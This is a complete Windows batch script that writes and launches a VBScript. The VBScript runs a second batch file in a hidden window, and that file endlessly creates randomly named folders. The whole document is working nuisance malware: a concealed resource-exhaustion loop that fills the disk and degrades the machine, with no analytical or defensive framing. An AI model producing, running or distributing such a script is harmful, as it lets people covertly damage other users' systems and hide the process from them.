@echo off
title Create_VBScript_and_execution_with_Infinity_Folders.bat
color 0a
mode con cols=37 lines=5
goto :Create_VBScript_hidden.vbs
:Create_VBScript_hidden.vbs
cd %cd% && set VBScript_hidden.vbs=hidden.vbs
echo Dim ObjectjShell > %VBScript_hidden.vbs%
echo Set ObjectjShell = CreateObject("WScript.Shell") >> %VBScript_hidden.vbs%
echo ObjectjShell.Run "Infinity_Folders.bat", 0, True >> %VBScript_hidden.vbs%
goto :Create_Infinity_Folders.bat
:Create_Infinity_Folders.bat
mkdir Execution_VBScript_hidden && cd Execution_VBScript_hidden
set Infinity_Folders.bat=Infinity_Folders.bat
echo @echo off > %Infinity_Folders.bat%
echo :Infinity_Folders >> %Infinity_Folders.bat%
echo mkdir ^%%random%%^ >> %Infinity_Folders.bat%
echo goto :Infinity_Folders >> %Infinity_Folders.bat%
goto :Execution_VBScript_hidden.vbs_with_Infinity_Folders
:Execution_VBScript_hidden.vbs_with_Infinity_Folders
cd .. && move %VBScript_hidden.vbs% Execution_VBScript_hidden > nul
cd Execution_VBScript_hidden && start %VBScript_hidden.vbs%
goto :exit
:exit
exit
